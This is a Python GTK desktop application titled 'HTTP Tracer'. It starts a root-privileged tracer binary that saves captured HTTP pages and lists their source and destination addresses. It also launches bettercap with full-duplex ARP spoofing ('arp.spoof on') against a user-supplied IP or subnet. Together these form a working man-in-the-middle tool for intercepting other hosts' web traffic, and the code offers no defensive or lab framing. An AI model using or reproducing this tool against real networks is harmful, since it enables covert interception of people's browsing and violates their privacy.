#!/usr/bin/env python3
import gi
import os
import subprocess
import threading
from datetime import datetime

gi.require_version('Gtk', '3.0')
from gi.repository import Gtk, GLib, Pango

WORK_DIR = os.path.dirname(os.path.abspath(__file__))
TRACER_BIN = os.path.join(WORK_DIR, 'bin', 'tracer')
IS_ROOT = os.geteuid() == 0


def as_root(cmd):
    return cmd if IS_ROOT else ['sudo'] + cmd


class App(Gtk.Window):
    def __init__(self):
        super().__init__(title='HTTP Tracer')
        self.set_default_size(800, 600)
        self.tracer_proc = None
        self.bettercap_proc = None
        self._build_ui()
        self.connect('destroy', self._quit)

    def _build_ui(self):
        root = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        self.add(root)
        root.pack_start(self._build_toolbar(), False, False, 0)
        root.pack_start(self._build_list(), True, True, 0)
        root.pack_start(self._build_bettercap_bar(), False, False, 0)

    # ── toolbar ───────────────────────────────────────────────────────────────

    def _build_toolbar(self):
        bar = Gtk.Box(spacing=6)
        bar.set_margin_start(8)
        bar.set_margin_end(8)
        bar.set_margin_top(6)
        bar.set_margin_bottom(6)

        self.btn_start = Gtk.Button(label='▶  Start Tracer')
        self.btn_start.connect('clicked', self._start_tracer)
        bar.pack_start(self.btn_start, False, False, 0)

        self.btn_stop = Gtk.Button(label='⏹  Stop Tracer')
        self.btn_stop.set_sensitive(False)
        self.btn_stop.connect('clicked', self._stop_tracer)
        bar.pack_start(self.btn_stop, False, False, 0)

        btn_clear = Gtk.Button(label='🗑  Clear')
        btn_clear.connect('clicked', lambda *_: self.store.clear())
        bar.pack_start(btn_clear, False, False, 0)

        self.tracer_lbl = Gtk.Label(label='● Tracer: stopped')
        bar.pack_start(self.tracer_lbl, False, False, 8)

        return bar

    # ── connections list ──────────────────────────────────────────────────────

    def _build_list(self):
        scroll = Gtk.ScrolledWindow()
        scroll.set_policy(Gtk.PolicyType.AUTOMATIC, Gtk.PolicyType.AUTOMATIC)

        # page title | source | destination | filename (hidden) | time
        self.store = Gtk.ListStore(str, str, str, str, str)
        tree = Gtk.TreeView(model=self.store)
        tree.set_headers_visible(True)
        tree.set_grid_lines(Gtk.TreeViewGridLines.HORIZONTAL)

        col_specs = [
            ('Page',        0, 340),
            ('Source',      1, 160),
            ('Destination', 2, 160),
            ('Time',        4,  80),
        ]
        for title, idx, width in col_specs:
            r = Gtk.CellRendererText()
            r.set_property('ellipsize', Pango.EllipsizeMode.END)
            col = Gtk.TreeViewColumn(title, r, text=idx)
            col.set_resizable(True)
            col.set_fixed_width(width)
            col.set_sizing(Gtk.TreeViewColumnSizing.FIXED)
            tree.append_column(col)

        tree.connect('row-activated', self._open_in_browser)
        scroll.add(tree)
        return scroll

    # ── bettercap bar ─────────────────────────────────────────────────────────

    def _build_bettercap_bar(self):
        frame = Gtk.Frame(label=' Bettercap — ARP Spoof (full-duplex) ')

        bar = Gtk.Box(spacing=8)
        bar.set_margin_start(8)
        bar.set_margin_end(8)
        bar.set_margin_top(6)
        bar.set_margin_bottom(6)

        bar.pack_start(Gtk.Label(label='Targets:'), False, False, 0)

        self.target_entry = Gtk.Entry()
        self.target_entry.set_placeholder_text('e.g. 192.168.1.0/24')
        self.target_entry.set_width_chars(22)
        bar.pack_start(self.target_entry, False, False, 0)

        self.btn_bc_start = Gtk.Button(label='▶  Start Bettercap')
        self.btn_bc_start.connect('clicked', self._start_bettercap)
        bar.pack_start(self.btn_bc_start, False, False, 0)

        self.btn_bc_stop = Gtk.Button(label='⏹  Stop Bettercap')
        self.btn_bc_stop.set_sensitive(False)
        self.btn_bc_stop.connect('clicked', self._stop_bettercap)
        bar.pack_start(self.btn_bc_stop, False, False, 0)

        self.bc_lbl = Gtk.Label(label='● Bettercap: stopped')
        bar.pack_start(self.bc_lbl, False, False, 8)

        frame.add(bar)
        return frame

    # ── tracer ────────────────────────────────────────────────────────────────

    def _start_tracer(self, *_):
        try:
            self.tracer_proc = subprocess.Popen(
                as_root([TRACER_BIN]),
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                cwd=WORK_DIR,
            )
        except Exception as e:
            self._error(f'Could not start tracer:\n{e}')
            return
        self.btn_start.set_sensitive(False)
        self.btn_stop.set_sensitive(True)
        self.tracer_lbl.set_text('● Tracer: running')
        threading.Thread(target=self._read_tracer,
                         args=(self.tracer_proc,), daemon=True).start()

    def _stop_tracer(self, *_):
        if self.tracer_proc:
            self.tracer_proc.terminate()
            self.tracer_proc = None
        self._set_tracer_stopped()

    def _set_tracer_stopped(self):
        self.tracer_proc = None
        self.btn_start.set_sensitive(True)
        self.btn_stop.set_sensitive(False)
        self.tracer_lbl.set_text('● Tracer: stopped')

    def _read_tracer(self, proc):
        for raw in proc.stdout:
            line = raw.decode('utf-8', errors='replace').rstrip('\n')
            if line.startswith('SAVED\t'):
                parts = line.split('\t')
                if len(parts) == 4:
                    _, filename, src, dst = parts
                    GLib.idle_add(self._add_row, filename, src, dst)
        GLib.idle_add(self._set_tracer_stopped)

    def _add_row(self, filename, src, dst):
        title = filename[:-5] if filename.endswith('.html') else filename
        now = datetime.now().strftime('%H:%M:%S')
        self.store.prepend([title, src, dst, filename, now])

    # ── open in browser ───────────────────────────────────────────────────────

    def _open_in_browser(self, tree, path, _col):
        it = self.store.get_iter(path)
        filename = self.store.get_value(it, 3)
        filepath = os.path.join(WORK_DIR, filename)
        if not os.path.exists(filepath):
            self._error(f'File not found:\n{filepath}')
            return
        subprocess.Popen(['xdg-open', filepath])

    # ── bettercap ─────────────────────────────────────────────────────────────

    def _start_bettercap(self, *_):
        targets = self.target_entry.get_text().strip()
        if not targets:
            self._error('Enter a target IP or subnet first.')
            return
        eval_str = (
            f'net.probe on; '
            f'set arp.spoof.targets {targets}; '
            f'set arp.spoof.fullduplex true; '
            f'arp.spoof on'
        )
        try:
            self.bettercap_proc = subprocess.Popen(
                as_root(['bettercap', '-eval', eval_str]),
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except Exception as e:
            self._error(f'Could not start bettercap:\n{e}')
            return
        self.btn_bc_start.set_sensitive(False)
        self.btn_bc_stop.set_sensitive(True)
        self.target_entry.set_sensitive(False)
        self.bc_lbl.set_text(f'● Bettercap: running  ({targets})')

    def _stop_bettercap(self, *_):
        if self.bettercap_proc:
            self.bettercap_proc.terminate()
            self.bettercap_proc = None
        self.btn_bc_start.set_sensitive(True)
        self.btn_bc_stop.set_sensitive(False)
        self.target_entry.set_sensitive(True)
        self.bc_lbl.set_text('● Bettercap: stopped')

    # ── helpers ───────────────────────────────────────────────────────────────

    def _quit(self, *_):
        self._stop_tracer()
        self._stop_bettercap()
        Gtk.main_quit()

    def _error(self, msg):
        dlg = Gtk.MessageDialog(
            parent=self, modal=True,
            message_type=Gtk.MessageType.ERROR,
            buttons=Gtk.ButtonsType.OK,
            text=msg,
        )
        dlg.run()
        dlg.destroy()


if __name__ == '__main__':
    win = App()
    win.show_all()
    Gtk.main()
